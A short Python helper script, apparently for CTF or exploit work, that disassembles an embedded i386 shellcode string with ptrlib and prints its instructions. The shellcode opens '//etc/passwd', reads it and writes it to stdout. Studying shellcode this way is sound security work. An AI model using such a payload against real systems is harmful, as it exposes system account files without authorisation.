#!/usr/bin/env python
import ptrlib as ptr

def unwrap(x):
    if x is None:
        ptr.logger.error("unwrap failed")
        exit(1)
    else:
        return x

# ptr.ELF("./")
shellcode = ""
shellcode += "\x31\xc9\xf7\xe1\xb0\x05\x51\x68\x73\x73"
shellcode += "\x77\x64\x68\x63\x2f\x70\x61\x68\x2f\x2f"
shellcode += "\x65\x74\x89\xe3\xcd\x80\x93\x91\xb0\x03"
shellcode += "\x31\xd2\x66\xba\xff\x0f\x42\xcd\x80\x92"
shellcode += "\x31\xc0\xb0\x04\xb3\x01\xcd\x80\x93\xcd"
shellcode += "\x80"

code = unwrap(ptr.disasm(shellcode, arch="i386"))
for i in code:
    print(f'    code += \"{i[1]};\"')
